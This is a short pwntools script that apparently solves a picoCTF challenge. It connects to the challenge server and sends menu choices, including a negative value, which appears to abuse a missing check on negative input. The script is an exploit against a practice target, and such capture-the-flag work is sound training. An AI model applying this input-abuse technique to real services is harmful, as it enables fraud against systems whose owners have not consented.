from pwn import *
r = remote('mercury.picoctf.net', 24851)
for i in range(4):
    r.sendline(b'1')
    r.sendline(b'-1')
r.sendline(b'2')
r.sendline(b'1')
r.interactive()
